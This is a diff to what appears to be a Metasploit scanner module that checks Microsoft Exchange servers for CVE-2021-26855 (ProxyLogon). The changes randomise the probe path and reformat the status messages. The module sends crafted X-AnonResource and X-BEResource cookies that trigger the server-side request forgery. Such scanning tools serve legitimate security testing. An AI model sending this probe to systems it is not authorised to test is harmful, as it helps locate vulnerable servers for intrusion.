@@ -58,28 +58,33 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-  def run_host(target_host)
-    uri = normalize_uri('owa', 'auth', 'x.js')
+  def message(msg)
+    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
+  end
 
+  def run_host(target_host)
+    @proto = (ssl ? 'https' : 'http')
+
+    uri = normalize_uri('ecp', "#{Rex::Text.rand_text_alpha(1..3)}.js")
     received = send_request_cgi(
       'method' => datastore['METHOD'],
       'uri' => uri,
       'cookie' => 'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'
     )
     unless received
-      print_error("#{full_uri(uri)} - No response, target seems down.")
+      print_error(message('No response, target seems down.'))
 
       return Exploit::CheckCode::Unknown
     end
 
     if received && received.code != 500
-      print_error("#{full_uri(uri)} - The target is not vulnerable to CVE-2021-26855.")
+      print_error(message('The target is not vulnerable to CVE-2021-26855.'))
       vprint_error("Obtained HTTP response code #{received.code} for #{full_uri(uri)}.")
 
       return Exploit::CheckCode::Safe
     end
 
-    print_good("#{full_uri(uri)} - The target is vulnerable to CVE-2021-26855.")
+    print_good(message('The target is vulnerable to CVE-2021-26855.'))
     msg = "Obtained HTTP response code #{received.code} for #{full_uri(uri)}."
     vprint_good(msg)
 
